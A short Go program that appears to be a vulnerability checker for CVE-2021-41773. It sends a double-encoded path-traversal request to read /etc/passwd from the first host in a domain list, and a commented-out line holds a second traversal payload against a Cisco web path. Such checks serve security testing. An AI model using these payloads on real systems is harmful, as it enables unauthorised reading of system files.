package main

// library to use net/http net/dialer
import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"strings"
)

func main() {
	file, err := os.Open("/Users/piyushchhiroliya/pingsafe/testdomains.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	if scanner.Scan() {
		fmt.Println()
		//arg1 := os.Args[1]
		//resp, err := http.Get(arg1 + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../")
		resp, err := http.Get("http://" + scanner.Text() + "/run?url=http%3A%2F%2Flocalhost%2Fcgi-bin%2F.%252e%2F.%252e%2F.%252e%2F.%252e%2Fetc%2Fpasswd&run=Submit")
		if err != nil {
			log.Fatal(err)
		}
		defer resp.Body.Close()
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			log.Fatal(err)
		}
		check := strings.Contains(string(body), "root:x:0:0:root:/root:/bin/bash")
		if check == true {
			fmt.Println("Host is Vulnerbale for CVE-2021-41773")
		} else {
			fmt.Println("All Hosts are secure")
		}
		//	fmt.Println(check)
		//fmt.Println(string(body))
		//	fmt.Printf("%s Instance Is Vulnerable for TDARR Remote Code Execution", arg1)
	}
}
